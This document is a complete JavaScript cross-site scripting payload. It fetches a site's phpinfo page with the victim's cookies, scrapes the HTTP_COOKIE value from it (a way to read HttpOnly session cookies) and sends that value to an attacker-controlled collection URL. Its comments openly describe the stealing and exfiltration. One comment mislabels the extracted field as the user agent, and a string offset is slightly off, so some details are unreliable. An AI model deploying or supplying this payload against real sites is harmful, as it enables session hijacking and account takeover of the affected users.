<script>
(function(){

    // URL of phpinfo() page on SAME ORIGIN
    var target = "/phpinfo.php";

    // Attacker server to receive stolen data
    var exfil = "https://attacker.com/collect?data=";

    // First request: grab phpinfo page
    var req = new XMLHttpRequest();
    req.withCredentials = true;     // include cookies
    req.open("GET", target, true);

    req.onload = function() {

        var html = this.responseText;

        // Extract the HTTP_USER_AGENT value (inside <td class="v">…</td>)
        var start = html.indexOf("HTTP_COOKIE");
        var value = "";

        if (start !== -1) {
            // move forward to value cell
            var cut = html.substring(start);
            var vStart = cut.indexOf('<td class="v">') + 15;
            var vEnd = cut.indexOf("</td>", vStart);
            value = cut.substring(vStart, vEnd).trim();
        } else {
            value = "NOT FOUND";
        }

        // Exfiltrate stolen content
        var req2 = new XMLHttpRequest();
        req2.open("GET", exfil + encodeURIComponent(value), false);
        req2.send();
    };

    req.send();

})();
</script>
